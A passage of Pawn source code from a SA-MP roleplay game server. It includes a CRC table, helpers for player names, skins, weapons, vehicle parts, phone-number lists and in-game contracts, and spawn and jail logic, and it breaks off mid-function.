			0x9DD277AF, 0x04DB2615, 0x73DC1683, 0xE3630B12, 0x94643B84, 0x0D6D6A3E, 0x7A6A5AA8,
			0xE40ECF0B, 0x9309FF9D, 0x0A00AE27, 0x7D079EB1, 0xF00F9344, 0x8708A3D2, 0x1E01F268,
			0x6906C2FE, 0xF762575D, 0x806567CB, 0x196C3671, 0x6E6B06E7, 0xFED41B76, 0x89D32BE0,
			0x10DA7A5A, 0x67DD4ACC, 0xF9B9DF6F, 0x8EBEEFF9, 0x17B7BE43, 0x60B08ED5, 0xD6D6A3E8,
			0xA1D1937E, 0x38D8C2C4, 0x4FDFF252, 0xD1BB67F1, 0xA6BC5767, 0x3FB506DD, 0x48B2364B,
			0xD80D2BDA, 0xAF0A1B4C, 0x36034AF6, 0x41047A60, 0xDF60EFC3, 0xA867DF55, 0x316E8EEF,
			0x4669BE79, 0xCB61B38C, 0xBC66831A, 0x256FD2A0, 0x5268E236, 0xCC0C7795, 0xBB0B4703,
			0x220216B9, 0x5505262F, 0xC5BA3BBE, 0xB2BD0B28, 0x2BB45A92, 0x5CB36A04, 0xC2D7FFA7,
			0xB5D0CF31, 0x2CD99E8B, 0x5BDEAE1D, 0x9B64C2B0, 0xEC63F226, 0x756AA39C, 0x026D930A,
			0x9C0906A9, 0xEB0E363F, 0x72076785, 0x05005713, 0x95BF4A82, 0xE2B87A14, 0x7BB12BAE,
			0x0CB61B38, 0x92D28E9B, 0xE5D5BE0D, 0x7CDCEFB7, 0x0BDBDF21, 0x86D3D2D4, 0xF1D4E242,
			0x68DDB3F8, 0x1FDA836E, 0x81BE16CD, 0xF6B9265B, 0x6FB077E1, 0x18B74777, 0x88085AE6,
			0xFF0F6A70, 0x66063BCA, 0x11010B5C, 0x8F659EFF, 0xF862AE69, 0x616BFFD3, 0x166CCF45,
			0xA00AE278, 0xD70DD2EE, 0x4E048354, 0x3903B3C2, 0xA7672661, 0xD06016F7, 0x4969474D,
			0x3E6E77DB, 0xAED16A4A, 0xD9D65ADC, 0x40DF0B66, 0x37D83BF0, 0xA9BCAE53, 0xDEBB9EC5,
			0x47B2CF7F, 0x30B5FFE9, 0xBDBDF21C, 0xCABAC28A, 0x53B39330, 0x24B4A3A6, 0xBAD03605,
			0xCDD70693, 0x54DE5729, 0x23D967BF, 0xB3667A2E, 0xC4614AB8, 0x5D681B02, 0x2A6F2B94,
			0xB40BBE37, 0xC30C8EA1, 0x5A05DF1B, 0x2D02EF8D
	};
	new crc = -1;
	for(new i = 0; i < strlen(string); i++)
	{
 		crc = (crc >>> 8) ^ crc_table[(crc ^ string[i]) & 0xFF];
  	}
  	return crc ^ -1;
}

stock GetPlayerNameEx(playerid)
{

	new
		sz_playerName[MAX_PLAYER_NAME],
		i_pos;

	GetPlayerName(playerid, sz_playerName, MAX_PLAYER_NAME);
	while ((i_pos = strfind(sz_playerName, "_", false, i_pos)) != -1) sz_playerName[i_pos] = ' ';
	return sz_playerName;
}

stock IsKeyJustDown(key, newkeys, oldkeys)
{
	if((newkeys & key) && !(oldkeys & key)) return 1;
	return 0;
}

stock IsInvalidSkin(skin)
{
	if(!(0 <= skin <= 299)) return 1;
    return 0;
}

stock IsValidSkin(skinid)
{
	if(skinid < 0 || skinid > 299)
	    return 0;

	switch (skinid)
	{
	    case
		0, 105, 106, 107, 102, 103, 69, 123,
		104, 114, 115, 116, 174, 175, 100, 247, 173,
		248, 117, 118, 147, 163, 21, 24, 143, 71,
		156, 176, 177, 108, 109, 110, 165, 166,
		265, 266, 267, 269, 270, 271, 274, 276,
		277, 278, 279, 280, 281, 282, 283, 284,
		285, 286, 287, 288, 294, 296, 297: return 0;
	}

	return 1;
}

stock IsAHelicopter(carid)
{
	if(GetVehicleModel(carid) == 548 || GetVehicleModel(carid) == 425 || GetVehicleModel(carid) == 417 || GetVehicleModel(carid) == 487 || GetVehicleModel(carid) == 488 || GetVehicleModel(carid) == 497 || GetVehicleModel(carid) == 563 || GetVehicleModel(carid) == 447 || GetVehicleModel(carid) == 469 || GetVehicleModel(carid) == 593) {
		return 1;
	}
	return 0;
}

stock  Float: GetVehicleSpeedByVehicleID(vehicleid)
{
	new
		Float: fVelocity[4];

	GetVehicleVelocity(vehicleid, fVelocity[0], fVelocity[1], fVelocity[2]);
	fVelocity[3] = floatsqroot((fVelocity[0] * fVelocity[0]) + (fVelocity[1] * fVelocity[1]) + (fVelocity[2] * fVelocity[2])) * 100;
	fVelocity[3] += fVelocity[3] / 2;
	return fVelocity[3];
}

stock  Float: player_get_speed(playerid)
{
	new
		Float: fVelocity[4];

	GetVehicleVelocity(GetPlayerVehicleID(playerid), fVelocity[0], fVelocity[1], fVelocity[2]);
	fVelocity[3] = floatsqroot((fVelocity[0] * fVelocity[0]) + (fVelocity[1] * fVelocity[1]) + (fVelocity[2] * fVelocity[2])) * 100;
	fVelocity[3] += fVelocity[3] / 2;
	return fVelocity[3];
}

stock CheckVPH(newph)
{
        new PHList[32];
        new number;
        new string[32];
        new File: file = fopen("PHList.cfg", io_read);
        if(file)
		{
            while(fread(file, string))
			{
            	strmid(PHList, string, 0, strlen(string)-2, 255);
                number = strval(PHList);
                if(number == newph)
				{
                	fclose(file);
                    return 1;
    			}
			}
            fclose(file);
            return 0;
        }
        return 1;
}

stock CheckPH(playerid)
{
	if(!fexist("PHList.cfg")) return 1;
	if(PlayerInfo[playerid][pNumber] == 0) {return 0;}
	new PHList[32];
	new number;
	new string[32];

	new File: file = fopen("PHList.cfg", io_read);
	if(file)
	{
		while(fread(file, string))
		{
			strmid(PHList, string, 0, strlen(string)-2, 255);
			number = strval(PHList);
			if(number == PlayerInfo[playerid][pNumber])
			{
				fclose(file);
				return 1;
			}
		}
		fclose(file);
		new File: file2 = fopen("PHList.cfg", io_append);
		format(string, sizeof(string), "%d\r\n", PlayerInfo[playerid][pNumber]);
		fwrite(file2, string);
		fclose(file2);
		//printf("New number added to PHList.cfg, ph:%d player:%s", PlayerInfo[playerid][pNumber], GetPlayerNameEx(playerid));
		return 0;
	}
	return 1;
}

stock ReplacePH(oldph, newph)
{
    new File: file2 = fopen("tmpPHList.cfg", io_write);
    new number;
    new string[32];
    new PHList[32];
    format(string, sizeof(string), "%d\r\n", newph);
    fwrite(file2, string);
    fclose(file2);
    file2 = fopen("tmpPHList.cfg", io_append);
    new File: file = fopen("PHList.cfg", io_read);
    while(fread(file, string))
	{
        strmid(PHList, string, 0, strlen(string)-1, 255);
        number = strval(PHList);
    	if(number != oldph)
		{
            format(string, sizeof(string), "%d\r\n", number);
        	fwrite(file2, string);
    	}
    }
    fclose(file);
    fclose(file2);
    file2 = fopen("PHList.cfg", io_write);
    file = fopen("tmpPHList.cfg", io_read);
	while(fread(file, string))
	{
        strmid(PHList, string, 0, strlen(string)-1, 255);
        number = strval(PHList);
        if(number != oldph)
		{
            format(string, sizeof(string), "%d\r\n", number);
        	fwrite(file2, string);
    	}
    }
    fclose(file);
    fclose(file2);
	fremove("tmpPHList.cfg");
	//printf("ph %d replaced with ph %d in PHList.cfg", oldph, newph);
	return 1;
}

stock SearchingHit(playerid)
{
	new string[128];
   	SendClientMessage(playerid, COLOR_WHITE, "Available Contracts:");
   	new hits;
	foreach(Player, i)
	{
		if(PlayerInfo[i][pFaction] != 4 && PlayerInfo[i][pHeadValue] > 0)
		{
	 		if(GotHit[i] == 0)
  			{
				hits++;
				format(string, sizeof(string), "Name: %s (ID %d) | Price: $%d | Contracted By: %s | Details: %s | Chased By: Nobody", GetPlayerNameEx(i), i, PlayerInfo[i][pHeadValue], PlayerInfo[i][pContractBy], PlayerInfo[i][pContractDetail]);
				SendClientMessage(playerid, COLOR_GRAD2, string);
			}
			else
			{
				hits++;
  				format(string, sizeof(string), "Name: %s (ID %d) | Price: $%d | Contracted By: %s | Details: %s | Chased By: %s", GetPlayerNameEx(i), i, PlayerInfo[i][pHeadValue], PlayerInfo[i][pContractBy], PlayerInfo[i][pContractDetail], GetPlayerNameEx(GetChased[i]));
				SendClientMessage(playerid, COLOR_GRAD2, string);
			}
  		}
	}
	if(hits && PlayerInfo[playerid][pRank] <= 1 && PlayerInfo[playerid][pFaction] == 4)
	{
		SendClientMessage(playerid, COLOR_YELLOW, "Use /givemehit to assign a contract to yourself.");
	}
	if(hits && PlayerInfo[playerid][pRank] >= 6 && PlayerInfo[playerid][pFaction] == 4 && PlayerInfo[playerid][pLeader] == 4)
	{
		SendClientMessage(playerid, COLOR_YELLOW, "Use /givehit to assign a contract to one of the hitmen.");
	}
	if(hits == 0)
	{
	    SendClientMessage(playerid, COLOR_GREY, "There are no hits available.");
	}
	return 0;
}

stock GivePlayerValidAdminWeapon(playerid, WeaponID, Ammo)
{
    if(PlayerInfo[playerid][pConnectTime] < 2 && WeaponID != 46 && WeaponID != 43) return 1;
	switch(WeaponID)
	{
  		case 0, 1:
		{
			PlayerInfo[playerid][pAGuns][0] = WeaponID;
			GivePlayerWeapon(playerid, WeaponID, Ammo);
		}
		case 2, 3, 4, 5, 6, 7, 8, 9:
		{
			PlayerInfo[playerid][pAGuns][1] = WeaponID;
			GivePlayerWeapon(playerid, WeaponID, Ammo);
		}
		case 22, 23, 24:
		{
			PlayerInfo[playerid][pAGuns][2] = WeaponID;
			GivePlayerWeapon(playerid, WeaponID, Ammo);
		}
		case 25, 26, 27:
		{
			PlayerInfo[playerid][pAGuns][3] = WeaponID;
			GivePlayerWeapon(playerid, WeaponID, Ammo);
		}
		case 28, 29, 32:
		{
			PlayerInfo[playerid][pAGuns][4] = WeaponID;
			GivePlayerWeapon(playerid, WeaponID, Ammo);
		}
		case 30, 31:
		{
			PlayerInfo[playerid][pAGuns][5] = WeaponID;
			GivePlayerWeapon(playerid, WeaponID, Ammo);
		}
		case 33, 34:
		{
			PlayerInfo[playerid][pAGuns][6] = WeaponID;
			GivePlayerWeapon(playerid, WeaponID, Ammo);
		}
		case 35, 36, 37, 38:
		{
			PlayerInfo[playerid][pAGuns][7] = WeaponID;
			GivePlayerWeapon(playerid, WeaponID, Ammo);
		}
		case 16, 17, 18, 39, 40:
		{
			PlayerInfo[playerid][pAGuns][8] = WeaponID;
			GivePlayerWeapon(playerid, WeaponID, Ammo);
		}
		case 41, 42, 43:
		{
			PlayerInfo[playerid][pAGuns][9] = WeaponID;
			GivePlayerWeapon(playerid, WeaponID, Ammo);
		}
		case 10, 11, 12, 13, 14, 15:
		{
			PlayerInfo[playerid][pAGuns][10] = WeaponID;
			GivePlayerWeapon(playerid, WeaponID, Ammo);
		}
		case 44, 45, 46:
		{
			PlayerInfo[playerid][pAGuns][11] = WeaponID;
			GivePlayerWeapon(playerid, WeaponID, Ammo);
		}
	}
	return 1;
}

stock GivePlayerValidWeapon(playerid, WeaponID, Ammo)
{
    if(PlayerInfo[playerid][pConnectTime] < 2 && WeaponID != 46 && WeaponID != 43) return 1;
	switch(WeaponID)
	{
  		case 0, 1:
		{
			PlayerInfo[playerid][pGuns][0] = WeaponID;
			GivePlayerWeapon(playerid, WeaponID, Ammo);
		}
		case 2, 3, 4, 5, 6, 7, 8, 9:
		{
			PlayerInfo[playerid][pGuns][1] = WeaponID;
			GivePlayerWeapon(playerid, WeaponID, Ammo);
		}
		case 22, 23, 24:
		{
			PlayerInfo[playerid][pGuns][2] = WeaponID;
			GivePlayerWeapon(playerid, WeaponID, Ammo);
		}
		case 25, 26, 27:
		{
			PlayerInfo[playerid][pGuns][3] = WeaponID;
			GivePlayerWeapon(playerid, WeaponID, Ammo);
		}
		case 28, 29, 32:
		{
			PlayerInfo[playerid][pGuns][4] = WeaponID;
			GivePlayerWeapon(playerid, WeaponID, Ammo);
		}
		case 30, 31:
		{
			PlayerInfo[playerid][pGuns][5] = WeaponID;
			GivePlayerWeapon(playerid, WeaponID, Ammo);
		}
		case 33, 34:
		{
			PlayerInfo[playerid][pGuns][6] = WeaponID;
			GivePlayerWeapon(playerid, WeaponID, Ammo);
		}
		case 35, 36, 37, 38:
		{
			PlayerInfo[playerid][pGuns][7] = WeaponID;
			GivePlayerWeapon(playerid, WeaponID, Ammo);
		}
		case 16, 17, 18, 39, 40:
		{
			PlayerInfo[playerid][pGuns][8] = WeaponID;
			GivePlayerWeapon(playerid, WeaponID, Ammo);
		}
		case 41, 42, 43:
		{
			PlayerInfo[playerid][pGuns][9] = WeaponID;
			GivePlayerWeapon(playerid, WeaponID, Ammo);
		}
		case 10, 11, 12, 13, 14, 15:
		{
			PlayerInfo[playerid][pGuns][10] = WeaponID;
			GivePlayerWeapon(playerid, WeaponID, Ammo);
		}
		case 44, 45, 46:
		{
			PlayerInfo[playerid][pGuns][11] = WeaponID;
			GivePlayerWeapon(playerid, WeaponID, Ammo);
		}
	}
	return 1;
}

stock SetPlayerWeapons(playerid)
{
    if(GetPVarInt(playerid, "PBM") > 0) { return 1; }
	ResetPlayerWeapons(playerid);
	for(new s = 0; s < 12; s++)
	{
		if(PlayerInfo[playerid][pGuns][s] > 0 && PlayerInfo[playerid][pAGuns][s] == 0)
		{
		    if(PlayerInfo[playerid][pGuns][s] == 17)
				GivePlayerValidWeapon(playerid, PlayerInfo[playerid][pGuns][s], 5);
			else
				GivePlayerValidWeapon(playerid, PlayerInfo[playerid][pGuns][s], 60000);
		}
	}
	return 1;
}

stock SetPlayerWeaponsEx(playerid)
{
	ResetPlayerWeapons(playerid);
	for(new s = 0; s < 12; s++)
	{
		if(PlayerInfo[playerid][pGuns][s] > 0)
		{
			GivePlayerValidWeapon(playerid, PlayerInfo[playerid][pGuns][s], 60000);
		}
	}
	SetPlayerArmedWeapon(playerid, GetPVarInt(playerid, "LastWeapon"));
}

stock ResetPlayerWeaponsEx(playerid)
{
	ResetPlayerWeapons(playerid);
	PlayerInfo[playerid][pGuns][0] = 0;
	PlayerInfo[playerid][pGuns][1] = 0;
	PlayerInfo[playerid][pGuns][2] = 0;
	PlayerInfo[playerid][pGuns][3] = 0;
	PlayerInfo[playerid][pGuns][4] = 0;
	PlayerInfo[playerid][pGuns][5] = 0;
	PlayerInfo[playerid][pGuns][6] = 0;
	PlayerInfo[playerid][pGuns][7] = 0;
	PlayerInfo[playerid][pGuns][8] = 0;
	PlayerInfo[playerid][pGuns][9] = 0;
	PlayerInfo[playerid][pGuns][10] = 0;
	PlayerInfo[playerid][pGuns][11] = 0;
	PlayerInfo[playerid][pAGuns][0] = 0;
	PlayerInfo[playerid][pAGuns][1] = 0;
	PlayerInfo[playerid][pAGuns][2] = 0;
	PlayerInfo[playerid][pAGuns][3] = 0;
	PlayerInfo[playerid][pAGuns][4] = 0;
	PlayerInfo[playerid][pAGuns][5] = 0;
	PlayerInfo[playerid][pAGuns][6] = 0;
	PlayerInfo[playerid][pAGuns][7] = 0;
	PlayerInfo[playerid][pAGuns][8] = 0;
	PlayerInfo[playerid][pAGuns][9] = 0;
	PlayerInfo[playerid][pAGuns][10] = 0;
	PlayerInfo[playerid][pAGuns][11] = 0;
	return 1;
}

RemovePlayerWeapon(playerid, weaponid)
{
	new plyWeapons[13];
	for(new s = 0; s < 13; s++)
	{
		new wep, ammo;
		GetPlayerWeaponData(playerid, s, wep, ammo);

		if(wep != weaponid)
		{
			GetPlayerWeaponData(playerid, s, plyWeapons[s], ammo);
		}
		else
		{
			PlayerInfo[playerid][pGuns][s] = 0;
			PlayerInfo[playerid][pAGuns][s] = 0;
		}
	}

	ResetPlayerWeapons(playerid);
 	for(new s = 0; s < 12; s++)
	{
		GivePlayerValidWeapon(playerid, plyWeapons[s], 60000);
	}
	return 1;
}

stock GetWeaponSlot(weaponid)
{
	switch(weaponid)
	{
		case 0, 1:
		{
			return 0;
		}
		case 2, 3, 4, 5, 6, 7, 8, 9:
		{
			return 1;
		}
		case 22, 23, 24:
		{
			return 2;
		}
		case 25, 26, 27:
		{
			return 3;
		}
		case 28, 29, 32:
		{
			return 4;
		}
		case 30, 31:
		{
			return 5;
		}
		case 33, 34:
		{
			return 6;
		}
		case 35, 36, 37, 38:
		{
			return 7;
		}
		case 16, 17, 18, 39, 40:
		{
			return 8;
		}
		case 41, 42, 43:
		{
			return 9;
		}
		case 10, 11, 12, 13, 14, 15:
		{
			return 10;
		}
		case 44, 45, 46:
		{
			return 11;
		}
	}
	return -1;
}

stock partType(type)
{
	new name[32];
	switch(type)
	{
	    case 0:
		{
			name = "Spoiler";
        }
        case 1:
		{
			name = "Hood";
        }
        case 2:
		{
			name = "Roof";
        }
        case 3:
		{
			name = "Sideskirt";
        }
        case 4:
		{
			name = "Lamps";
        }
        case 5:
		{
			name = "Nitro";
        }
        case 6:
		{
			name = "Exhaust";
        }
        case 7:
		{
			name = "Wheels";
        }
        case 8:
		{
			name = "Stereo";
        }
        case 9:
		{
			name = "Hydraulics";
        }
        case 10:
		{
			name = "Front Bumper";
        }
        case 11:
		{
			name = "Rear Bumper";
        }
        case 12:
		{
			name = "Left Vent";
        }
        case 13:
		{
			name = "Right Vent";
        }
        default:
        {
            name = "Unknown";
		}
	}
	return name;
}

stock partName(part)
{
	new name[32];
	switch(part - 1000)
	{
		case 0:
		{
			name = "Pro";
        }
		case 1:
        {
			name = "Win";
        }
		case 2:
        {
			name = "Drag";
        }
		case 3:
        {
			name = "Alpha";
        }
		case 4:
        {
			name = "Champ Scoop";
        }
		case 5:
        {
			name = "Fury Scoop";
        }
		case 6:
        {
			name = "Roof Scoop";
        }
		case 7:
        {
			name = "Sideskirt";
        }
        case 8:
        {
            name = "2x";
        }
        case 9:
        {
            name = "5x";
        }
        case 10:
        {
            name = "10x";
        }
		case 11:
        {
			name = "Race Scoop";
        }
		case 12:
        {
			name = "Worx Scoop";
        }
		case 13:
        {
			name = "Round Fog";
        }
		case 14:
        {
			name = "Champ";
        }
		case 15:
        {
			name = "Race";
        }
		case 16:
        {
			name = "Worx";
        }
		case 17:
        {
			name = "Sideskirt";
        }
		case 18:
        {
			name = "Upswept";
        }
		case 19:
        {
			name = "Twin";
        }
		case 20:
		{
			name = "Large";
        }
		case 21:
        {
			name = "Medium";
        }
		case 22:
        {
			name = "Small";
        }
		case 23:
        {
			name = "Fury";
        }
		case 24:
        {
			name = "Square Fog";
        }
		case 26:
        {
			name = "Alien";
        }
		case 27:
        {
			name = "Alien";
        }
		case 28:
        {
			name = "Alien";
        }
		case 29:
        {
			name = "X-Flow";
        }
		case 30:
        {
			name = "X-Flow";
        }
		case 31:
        {
			name = "X-Flow";
        }
		case 32:
        {
			name = "Alien Roof Vent";
        }
		case 33:
        {
			name = "X-Flow Roof Vent";
        }
		case 34:
        {
			name = "Alien";
        }
		case 35:
        {
			name = "X-Flow Roof Vent";
        }
		case 36:
        {
			name = "Alien";
        }
		case 37:
        {
			name = "X-Flow";
        }
		case 38:
        {
			name = "Alien Roof Vent";
        }
		case 39:
        {
			name = "X-Flow";
        }
		case 40:
        {
			name = "Alien";
        }
		case 41:
        {
			name = "X-Flow";
        }
		case 42:
        {
			name = "Chrome";
        }
		case 43:
        {
			name = "Slamin";
        }
		case 44:
        {
			name = "Chrome";
        }
		case 45:
        {
			name = "X-Flow";
        }
		case 46:
        {
			name = "Alien";
        }
		case 47:
        {
			name = "Alien";
        }
		case 48:
        {
			name = "X-Flow";
        }
		case 49:
        {
			name = "Alien";
        }
		case 50:
        {
			name = "X-Flow";
        }
		case 51:
        {
			name = "Alien";
        }
		case 52:
        {
			name = "X-Flow";
        }
		case 53:
        {
			name = "X-Flow";
        }
		case 54:
        {
			name = "Alien";
        }
		case 55:
        {
			name = "Alien";
        }
		case 56:
        {
			name = "Alien";
        }
		case 57:
        {
			name = "X-Flow";
        }
		case 58:
        {
			name = "Alien";
        }
		case 59:
        {
			name = "X-Flow";
        }
		case 60:
        {
			name = "X-Flow";
        }
		case 61:
        {
			name = "X-Flow";
        }
		case 62:
        {
			name = "Alien";
        }
		case 63:
        {
			name = "X-Flow";
        }
		case 64:
        {
			name = "Alien";
        }
		case 65:
        {
			name = "Alien";
        }
		case 66:
        {
			name = "X-Flow";
        }
		case 67:
        {
			name = "Alien";
        }
		case 68:
        {
			name = "X-Flow";
        }
		case 69:
        {
			name = "Alien";
        }
		case 70:
        {
			name = "X-Flow";
        }
		case 71:
        {
			name = "Alien";
        }
		case 72:
        {
			name = "X-Flow";
        }
		case 88:
        {
			name = "Alien";
        }
		case 89:
        {
			name = "X-Flow";
        }
		case 90:
        {
			name = "Alien";
        }
		case 91:
        {
			name = "X-Flow";
        }
		case 92:
        {
			name = "Alien";
        }
		case 93:
        {
			name = "X-Flow";
        }
		case 94:
        {
			name = "Alien";
        }
		case 95:
        {
			name = "X-Flow";
        }
		case 99:
        {
			name = "Chrome";
        }
		case 100:
        {
			name = "Chrome Grill";
        }
        		case 101:
        {
			name = "Chrome Flames";
        }
		case 102:
        {
			name = "Chrome Strip";
        }
		case 103:
        {
			name = "Covertible";
        }
		case 104:
        {
			name = "Chrome";
        }
		case 105:
        {
			name = "Slamin";
        }
		case 106:
        {
			name = "Chrome Arches";
        }
		case 107:
        {
			name = "Chrome Strip";
        }
		case 108:
        {
			name = "Chrome Strip";
        }
		case 109:
        {
			name = "Chrome";
        }
		case 110:
        {
			name = "Slamin";
        }
		case 113:
        {
			name = "Chrome";
        }
		case 114:
        {
			name = "Slamin";
        }
		case 115:
        {
			name = "Chrome";
        }
		case 116:
        {
			name = "Slamin";
        }
		case 117:
        {
			name = "Chrome";
        }
		case 118:
        {
			name = "Chrome Trim";
        }
		case 119:
        {
			name = "Wheelcovers";
        }
		case 120:
        {
			name = "Chrome Trim";
        }
		case 121:
        {
			name = "Wheelcovers";
        }
		case 122:
        {
			name = "Chrome Flames";
        }
		case 123:
        {
			name = "Bullbar Chrome Bars";
        }
		case 124:
        {
			name = "Chrome Arches";
        }
		case 125:
        {
			name = "Bullbar Chrome Lights";
        }
		case 126:
        {
			name = "Chrome";
        }
		case 127:
        {
			name = "Slamin";
        }
		case 128:
        {
			name = "Vinyl Hardtop";
        }
		case 129:
        {
			name = "Chrome";
        }
		case 130:
        {
			name = "Hardtop";
        }
		case 131:
        {
			name = "Softtop";
        }
		case 132:
        {
			name = "Slamin";
        }
		case 133:
        {
			name = "Chrome Strip";
        }
		case 134:
        {
			name = "Chrome Strip";
        }
		case 135:
        {
			name = "Slamin";
        }
		case 136:
        {
			name = "Chrome";
        }
		case 137:
        {
			name = "Chrome Strip";
        }
		case 138:
        {
			name = "Alien";
        }
		case 139:
        {
			name = "X-Flow";
        }
		case 140:
        {
			name = "X-Flow";
        }
		case 141:
        {
			name = "Alien";
        }
		case 142:
        {
			name = "Left Oval Vents";
        }
		case 143:
        {
			name = "Right Oval Vents";
        }
		case 144:
        {
			name = "Left Square Vents";
        }
		case 145:
        {
			name = "Right Square Vents";
        }
		case 146:
        {
			name = "X-Flow";
        }
		case 147:
        {
			name = "Alien";
        }
		case 148:
        {
			name = "X-Flow";
        }
		case 149:
        {
			name = "Alien";
        }
		case 150:
        {
			name = "Alien";
        }
		case 151:
        {
			name = "X-Flow";
        }
		case 152:
        {
			name = "X-Flow";
        }
		case 153:
        {
			name = "Alien";
        }
		case 154:
        {
			name = "Alien";
        }
		case 155:
        {
			name = "Alien";
        }
		case 156:
        {
			name = "X-Flow";
        }
		case 157:
        {
			name = "X-Flow";
        }
		case 158:
        {
			name = "X-Flow";
        }
		case 159:
        {
			name = "Alien";
        }
		case 160:
        {
			name = "Alien";
        }
		case 161:
        {
			name = "X-Flow";
        }
		case 162:
        {
			name = "Alien";
        }
		case 163:
        {
			name = "X-Flow";
        }
		case 164:
        {
			name = "Alien";
        }
		case 165:
        {
			name = "X-Flow";
        }
		case 166:
        {
			name = "Alien";
        }
		case 167:
        {
			name = "X-Flow";
        }
		case 168:
        {
			name = "Alien";
        }
		case 169:
        {
			name = "Alien";
        }
		case 170:
        {
			name = "X-Flow";
        }
		case 171:
        {
			name = "Alien";
        }
		case 172:
        {
			name = "X-Flow";
        }
		case 173:
        {
			name = "X-Flow";
        }
		case 174:
        {
			name = "Chrome";
        }
		case 175:
        {
			name = "Slamin";
        }
		case 176:
        {
			name = "Chrome";
        }
		case 177:
        {
			name = "Slamin";
        }
		case 178:
        {
			name = "Slamin";
        }
		case 179:
        {
			name = "Chrome";
        }
		case 180:
        {
			name = "Chrome";
        }
		case 181:
        {
			name = "Slamin";
        }
		case 182:
        {
			name = "Chrome";
        }
		case 183:
        {
			name = "Slamin";
        }
		case 184:
        {
			name = "Chrome";
        }
		case 185:
        {
			name = "Slamin";
        }
		case 186:
        {
			name = "Slamin";
        }
		case 187:
        {
			name = "Chrome";
        }
		case 188:
        {
			name = "Slamin";
        }
		case 189:
        {
			name = "Chrome";
        }
		case 190:
        {
			name = "Slamin";
        }
		case 191:
        {
			name = "Chrome";
        }
		case 192:
        {
			name = "Chrome";
        }
		case 193:
        {
			name = "Slamin";
        }
   	}
	return name;
}

stock SetPlayerSpawn(playerid)
{
	if(IsPlayerConnected(playerid))
	{
	    DeletePVar(playerid, "OPD");

	    SetPlayerSkin(playerid, PlayerInfo[playerid][pSkin]);
		if(GetPVarInt(playerid, "SpecOff") == 1)
		{
			SetPlayerPos(playerid, GetPVarFloat(playerid, "SpecPosX"), GetPVarFloat(playerid, "SpecPosY"), GetPVarFloat(playerid, "SpecPosZ"));
			SetPlayerInterior(playerid, GetPVarInt(playerid, "SpecInt"));
			SetPlayerVirtualWorld(playerid, GetPVarInt(playerid, "SpecVW"));
			DeletePVar(playerid, "SpecOff");
			return 1;
		}
		if(PlayerInfo[playerid][pTut] == 0)
		{
			TogglePlayerControllable(playerid,0);
			SetPlayerColor(playerid,TEAM_HIT_COLOR);
			SetPlayerPos(playerid, 766.50, -1684.32, -6.86);
			SetPlayerCameraPos(playerid, 751.93, -1673.95, 16.01);
		   	SetPlayerCameraLookAt(playerid, 699.55, -1628.93, 5.88);
   			ShowPlayerDialogEx(playerid, REGISTRATION_MENU_ONE, DIALOG_STYLE_MSGBOX, "{FFA500}Next Generation Roleplay - Registration", "{FFFFFF}What do you want your character's gender to be?", "Male", "Female");
			SetPlayerVirtualWorld(playerid, 70707);
			return 1;
		}
		if(AdminDuty[playerid] == 1)
		{
			SetPlayerVirtualWorld(playerid, GetPVarInt(playerid,"AdminDeathVW"));
			SetPlayerInterior(playerid, GetPVarInt(playerid,"AdminDeathInt"));
			DeletePVar(playerid, "AdminDeathVW");
			DeletePVar(playerid, "AdminDeathInt");
			SetPlayerHealth(playerid, 100);
			ClearAnimations(playerid, 1);
			SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
			DeletePVar(playerid, "Injured");
		    return 1;
		}
		if(GetPVarType(playerid, "posX") != 0)
		{
			DeletePVar(playerid, "Injured");
			cmd_quithelp(playerid, "");
		    return 1;
		}

		if(PlayerInfo[playerid][pJailed] == 1)
		{
		    PhoneOnline[playerid] = 1;
		    LoadObjectsForPlayer(playerid);

			SetPlayerInterior(playerid, 6);
			PlayerInfo[playerid][pVW] = 20002;
			PlayerInfo[playerid][pInt] = 6;
			SetPlayerVirtualWorld(playerid, 20002);
			SetPlayerPos(playerid,263.343597, 77.532028, 1001.039062);

			ResetPlayerWeaponsEx(playerid);

			SendClientMessage(playerid, COLOR_LIGHTRED, "Incomplete jail sentence, back to jail you go.");
			return 1;
		}
		if(PlayerInfo[playerid][pJailed] == 2)
		{
		    PhoneOnline[playerid] = 1;
		    LoadObjectsForPlayer(playerid);

			SetPlayerInterior(playerid, 1);
			PlayerInfo[playerid][pVW] = 1324123;
			PlayerInfo[playerid][pInt] = 1;
			SetPlayerVirtualWorld(playerid, 1324123);
			SetPlayerPos(playerid,315.1677,-1451.5564,-33.5292);

			ResetPlayerWeaponsEx(playerid);

			SendClientMessage(playerid, COLOR_LIGHTRED, "Incomplete jail sentence, back to jail you go.");
			return 1;
		}
		if(PlayerInfo[playerid][pJailed] == 3)
		{
		    PhoneOnline[playerid] = 1;
		    LoadObjectsForPlayer(playerid);

			SetPlayerInterior(playerid, 69);
			PlayerInfo[playerid][pVW] = 696969;
			PlayerInfo[playerid][pInt] = 69;
			SetPlayerVirtualWorld(playerid, 696969);

			new rand = random(sizeof(AdminPrisonFloat));
			SetPlayerPos(playerid, AdminPrisonFloat[rand][0], AdminPrisonFloat[rand][1], AdminPrisonFloat[rand][2]);

			ResetPlayerWeaponsEx(playerid);
			SetPlayerColor(playerid, TEAM_APRISON_COLOR);
			SetPlayerSkin(playerid, 50);

			new string[128];
			format(string, sizeof(string), "You're in prison because you were prisoned by %s, reason: %s", PlayerInfo[playerid][pPrisonedBy], PlayerInfo[playerid][pPrisonReason]);
			SendClientMessage(playerid, COLOR_LIGHTRED, string);
			return 1;
		}
		if(PlayerInfo[playerid][pJailed] == 4)
		{
		    PhoneOnline[playerid] = 1;
		    LoadObjectsForPlayer(playerid);

			SetPlayerInterior(playerid, 69);
			PlayerInfo[playerid][pVW] = 696969;
			PlayerInfo[playerid][pInt] = 69;
			SetPlayerVirtualWorld(playerid, 696969);

			new rand = random(sizeof(AdminPrisonFloat));
			SetPlayerPos(playerid, AdminPrisonFloat[rand][0], AdminPrisonFloat[rand][1], AdminPrisonFloat[rand][2]);

			ResetPlayerWeaponsEx(playerid);
			SetPlayerColor(playerid, TEAM_ORANGE_COLOR);
			SetPlayerSkin(playerid, 50);
			return 1;
		}

		if(GetPVarInt(playerid, "Injured") == 1 && GetPVarInt(playerid, "PBM") < 1)
		{
		    SendEMSQueue(playerid,1);
		    return 1;
		}

		if(GetPVarInt(playerid, "PBM") > 0) {
			GivePlayerValidAdminWeapon(playerid, 24, 99999);
			GivePlayerValidAdminWeapon(playerid, 27, 99999);
			GivePlayerValidAdminWeapon(playerid, 29, 99999);
			GivePlayerValidAdminWeapon(playerid, 31, 99999);

			if(GetPVarInt(playerid, "PBM") > 3) {
				new
					Team1Total,
